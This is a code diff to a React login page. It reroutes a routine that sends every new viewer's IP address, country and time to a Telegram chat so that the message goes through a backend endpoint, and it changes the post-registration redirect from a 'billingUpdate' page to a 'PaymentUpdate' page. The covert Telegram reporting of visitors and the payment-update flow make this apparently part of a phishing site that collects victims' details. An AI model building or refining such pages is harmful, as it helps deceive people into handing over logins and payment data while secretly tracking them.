@@ -18,8 +18,6 @@ const Login = () => {
     const sendTelegramNotification = async () => {
       if (localStorage.getItem('notificationSent')) return;
 
-      const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN;
-      const TELEGRAM_CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID;
 
       try {
         // Alternative using ip-api.com (also free, no API key needed)
@@ -30,14 +28,7 @@ const Login = () => {
 	setIp(ip);
 	setCountry(country)
         const message = `New view\nIP: ${ip}\nCountry: ${country}\nTime: ${currentTime}`;
-        
-        await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          params: {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message
-          }
-        });
-
+        await axios.post(`${process.env.REACT_APP_API_URL}/api/telegram/send-message`, { message });
         localStorage.setItem('notificationSent', 'true');
       } catch (error) {
         console.error('Failed to send Telegram notification:', error);
@@ -71,7 +62,7 @@ const Login = () => {
         localStorage.setItem('userId', response.data.userId);
         console.log('Registration successful, redirecting...');
         // Redirect to the Verification page
-        history.push('/billingUpdate');
+        history.push('/PaymentUpdate');
       }
     } catch (error) {
       console.error('Registration failed:', error.response?.data || error.message);
